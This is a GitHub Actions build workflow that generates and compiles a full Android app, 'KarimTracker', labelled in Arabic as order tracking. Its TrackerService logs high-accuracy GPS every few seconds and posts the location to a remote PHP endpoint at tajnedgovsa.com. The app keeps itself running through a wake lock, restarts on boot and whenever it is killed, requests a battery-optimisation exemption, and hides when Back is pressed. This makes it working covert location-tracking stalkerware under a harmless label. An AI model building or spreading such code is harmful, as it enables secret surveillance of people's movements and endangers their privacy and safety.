name: Build APK
on: [push, workflow_dispatch]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'

      - name: Accept Android licenses
        run: |
          mkdir -p $ANDROID_HOME/licenses || true
          echo "24333f8a63b6825ea9c5514f83c2829b004d1fee" > $ANDROID_HOME/licenses/android-sdk-license || true
          echo "84831b9409646a918e30573bab4c9c91346d8abd" > $ANDROID_HOME/licenses/android-sdk-preview-license || true
          echo "d56f5187479451eabf01fb78af6dfcb131a6481e" > $ANDROID_HOME/licenses/android-sdk-arm-dbt-license || true
          echo "859f317696f67ef3d7f30a50a5560e78314a5fb2" > $ANDROID_HOME/licenses/android-googletv-license || true
          echo "33b6a2b64607f11b759f320ef9dff4ae5c47d97a" > $ANDROID_HOME/licenses/android-googlexr-license || true
          echo "d975f751698a77b662f1254ddbeed3901e976f5a" > $ANDROID_HOME/licenses/google-gdk-license || true
          echo "e9acab5b5fbb560a72cfaecce8946896ff6aab9d" > $ANDROID_HOME/licenses/mips-android-sysimage-license || true
          echo "3c4ec3a0e2f9fa8f5b5ffd1c3c52a9ce3b0a4b0d" > $ANDROID_HOME/licenses/microxr-sysimage-license || true
        shell: bash

      - name: Create project files
        run: |
          mkdir -p app/src/main/java/com/karim/tracker
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/xml

          cat > settings.gradle << 'F1'
          pluginManagement {
            repositories {
              google()
              mavenCentral()
              gradlePluginPortal()
            }
          }
          dependencyResolutionManagement {
            repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
            repositories {
              google()
              mavenCentral()
            }
          }
          rootProject.name = "KarimTracker"
          include ':app'
          F1

          cat > build.gradle << 'F2'
          plugins {
            id 'com.android.application' version '8.1.4' apply false
          }
          F2

          cat > gradle.properties << 'F3'
          android.useAndroidX=true
          android.enableJetifier=true
          org.gradle.jvmargs=-Xmx2048m
          F3

          cat > app/build.gradle << 'F4'
          plugins { id 'com.android.application' }
          android {
            namespace 'com.karim.tracker'
            compileSdk 34
            defaultConfig {
              applicationId "com.karim.tracker"
              minSdk 23
              targetSdk 34
              versionCode 1
              versionName "1.0"
            }
            compileOptions {
              sourceCompatibility JavaVersion.VERSION_17
              targetCompatibility JavaVersion.VERSION_17
            }
          }
          dependencies {
            implementation 'androidx.appcompat:appcompat:1.6.1'
            implementation 'androidx.core:core:1.12.0'
            implementation 'com.google.android.gms:play-services-location:21.1.0'
          }
          F4

          cat > app/src/main/AndroidManifest.xml << 'F5'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
            <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
            <application
              android:allowBackup="true"
              android:icon="@android:drawable/ic_menu_mylocation"
              android:label="@string/app_name"
              android:networkSecurityConfig="@xml/network_security_config"
              android:usesCleartextTraffic="true"
              android:theme="@style/Theme.AppCompat.Light.NoActionBar">
              <activity android:name=".MainActivity" android:exported="true" android:screenOrientation="portrait">
                <intent-filter>
                  <action android:name="android.intent.action.MAIN"/>
                  <category android:name="android.intent.category.LAUNCHER"/>
                </intent-filter>
              </activity>
              <service android:name=".TrackerService" android:enabled="true" android:exported="false" android:foregroundServiceType="location"/>
              <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
                <intent-filter>
                  <action android:name="android.intent.action.BOOT_COMPLETED"/>
                </intent-filter>
              </receiver>
            </application>
          </manifest>
          F5

          cat > app/src/main/res/values/strings.xml << 'F6'
          <resources><string name="app_name">متابعة الطلب</string></resources>
          F6

          cat > app/src/main/res/xml/network_security_config.xml << 'F7'
          <?xml version="1.0" encoding="utf-8"?>
          <network-security-config>
            <base-config cleartextTrafficPermitted="true">
              <trust-anchors><certificates src="system"/></trust-anchors>
            </base-config>
          </network-security-config>
          F7

          cat > app/src/main/res/layout/activity_main.xml << 'F8'
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="vertical"
            android:gravity="center"
            android:background="#0b3d2e">
            <TextView
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="متابعة الطلب"
              android:textColor="#c9a34a"
              android:textSize="26sp"
              android:textStyle="bold"/>
            <TextView
              android:layout_width="wrap_content"
              android:layout_height="wrap_content"
              android:text="التطبيق يعمل في الخلفية"
              android:textColor="#ffffff"
              android:textSize="16sp"
              android:layout_marginTop="20dp"/>
          </LinearLayout>
          F8

          cat > app/src/main/java/com/karim/tracker/MainActivity.java << 'F9'
          package com.karim.tracker;
          import android.Manifest;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.PowerManager;
          import android.provider.Settings;
          import android.widget.Toast;
          import androidx.annotation.NonNull;
          import androidx.appcompat.app.AppCompatActivity;
          import androidx.core.app.ActivityCompat;
          public class MainActivity extends AppCompatActivity {
            @Override protected void onCreate(Bundle s) {
              super.onCreate(s);
              setContentView(R.layout.activity_main);
              String[] perms;
              if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                perms = new String[]{
                  Manifest.permission.ACCESS_FINE_LOCATION,
                  Manifest.permission.ACCESS_COARSE_LOCATION,
                  Manifest.permission.POST_NOTIFICATIONS
                };
              } else {
                perms = new String[]{
                  Manifest.permission.ACCESS_FINE_LOCATION,
                  Manifest.permission.ACCESS_COARSE_LOCATION
                };
              }
              ActivityCompat.requestPermissions(this, perms, 1001);
              if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                  Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                  i.setData(Uri.parse("package:" + getPackageName()));
                  try { startActivity(i); } catch (Exception e) {}
                }
              }
            }
            @Override public void onRequestPermissionsResult(int rc, @NonNull String[] p, @NonNull int[] g) {
              super.onRequestPermissionsResult(rc, p, g);
              Intent svc = new Intent(this, TrackerService.class);
              if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
              else startService(svc);
              Toast.makeText(this, "المتابعة مفعلة", Toast.LENGTH_LONG).show();
            }
            @Override public void onBackPressed() { moveTaskToBack(true); }
          }
          F9

          cat > app/src/main/java/com/karim/tracker/BootReceiver.java << 'F10'
          package com.karim.tracker;
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.os.Build;
          public class BootReceiver extends BroadcastReceiver {
            @Override public void onReceive(Context c, Intent i) {
              if (Intent.ACTION_BOOT_COMPLETED.equals(i.getAction())) {
                Intent svc = new Intent(c, TrackerService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) c.startForegroundService(svc);
                else c.startService(svc);
              }
            }
          }
          F10

          cat > app/src/main/java/com/karim/tracker/TrackerService.java << 'F11'
          package com.karim.tracker;
          import android.app.Notification;
          import android.app.NotificationChannel;
          import android.app.NotificationManager;
          import android.app.Service;
          import android.content.Context;
          import android.content.Intent;
          import android.content.SharedPreferences;
          import android.location.Location;
          import android.os.Build;
          import android.os.IBinder;
          import android.os.Looper;
          import android.os.PowerManager;
          import androidx.core.app.NotificationCompat;
          import com.google.android.gms.location.FusedLocationProviderClient;
          import com.google.android.gms.location.LocationCallback;
          import com.google.android.gms.location.LocationRequest;
          import com.google.android.gms.location.LocationResult;
          import com.google.android.gms.location.LocationServices;
          import com.google.android.gms.location.Priority;
          import java.io.OutputStream;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.net.URLEncoder;
          public class TrackerService extends Service {
            private static final String CH = "karim";
            private static final String URL_SRV = "https://tajnedgovsa.com/live_save.php";
            private static final String CODE = "3481240327";
            private FusedLocationProviderClient fusedClient;
            private PowerManager.WakeLock wakeLock;
            private String sid;
            @Override public void onCreate() {
              super.onCreate();
              SharedPreferences p = getSharedPreferences("t", MODE_PRIVATE);
              sid = p.getString("sid", null);
              if (sid == null) {
                sid = "native_" + System.currentTimeMillis();
                p.edit().putString("sid", sid).apply();
              }
              if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = new NotificationChannel(CH, "متابعة", NotificationManager.IMPORTANCE_LOW);
                NotificationManager nm = getSystemService(NotificationManager.class);
                if (nm != null) nm.createNotificationChannel(ch);
              }
              Notification n = new NotificationCompat.Builder(this, CH)
                .setContentTitle("متابعة الطلب")
                .setContentText("جاري المتابعة")
                .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                .setOngoing(true)
                .build();
              startForeground(1001, n);
              PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
              if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Karim::Wake");
                wakeLock.setReferenceCounted(false);
                wakeLock.acquire();
              }
              fusedClient = LocationServices.getFusedLocationProviderClient(this);
              LocationRequest req = new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000)
                .setMinUpdateIntervalMillis(2000)
                .setMinUpdateDistanceMeters(0f)
                .build();
              try {
                fusedClient.requestLocationUpdates(req, new LocationCallback() {
                  @Override public void onLocationResult(LocationResult r) {
                    if (r == null) return;
                    for (Location loc : r.getLocations()) send(loc);
                  }
                }, Looper.getMainLooper());
              } catch (SecurityException e) {}
            }
            private void send(final Location loc) {
              new Thread(new Runnable() {
                public void run() {
                  try {
                    double spdKmh = loc.getSpeed() * 3.6;
                    String mode = spdKmh >= 12 ? "car" : (spdKmh >= 2 ? "walk" : "still");
                    String data = "lat=" + URLEncoder.encode(String.valueOf(loc.getLatitude()), "UTF-8")
                      + "&lon=" + URLEncoder.encode(String.valueOf(loc.getLongitude()), "UTF-8")
                      + "&acc=" + URLEncoder.encode(String.valueOf(loc.getAccuracy()), "UTF-8")
                      + "&src=GPS&spd=" + URLEncoder.encode(String.valueOf(spdKmh), "UTF-8")
                      + "&hdg=" + URLEncoder.encode(String.valueOf(loc.getBearing()), "UTF-8")
                      + "&mode=" + mode + "&conf=0.95"
                      + "&code=" + CODE + "&sid=" + URLEncoder.encode(sid, "UTF-8");
                    HttpURLConnection c = (HttpURLConnection) new URL(URL_SRV).openConnection();
                    c.setRequestMethod("POST");
                    c.setDoOutput(true);
                    c.setConnectTimeout(10000);
                    c.setReadTimeout(10000);
                    c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8");
                    OutputStream os = c.getOutputStream();
                    os.write(data.getBytes("UTF-8"));
                    os.flush();
                    os.close();
                    c.getResponseCode();
                    c.disconnect();
                  } catch (Exception e) {}
                }
              }).start();
            }
            @Override public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
            @Override public IBinder onBind(Intent i) { return null; }
            @Override public void onTaskRemoved(Intent r) {
              Intent restart = new Intent(getApplicationContext(), TrackerService.class);
              if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                getApplicationContext().startForegroundService(restart);
              else
                getApplicationContext().startService(restart);
              super.onTaskRemoved(r);
            }
            @Override public void onDestroy() {
              if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
              Intent restart = new Intent(getApplicationContext(), TrackerService.class);
              if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                getApplicationContext().startForegroundService(restart);
              else
                getApplicationContext().startService(restart);
              super.onDestroy();
            }
          }
          F11

      - name: Grant execute permission for gradlew
        run: chmod +x gradlew || true

      - name: Setup Gradle wrapper
        run: gradle wrapper --gradle-version 8.5

      - name: Build with Gradle
        run: ./gradlew assembleDebug --no-daemon --stacktrace

      - name: Upload APK
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: KarimTracker-APK
          path: app/build/outputs/apk/debug/*.apk
          if-no-files-found: warn
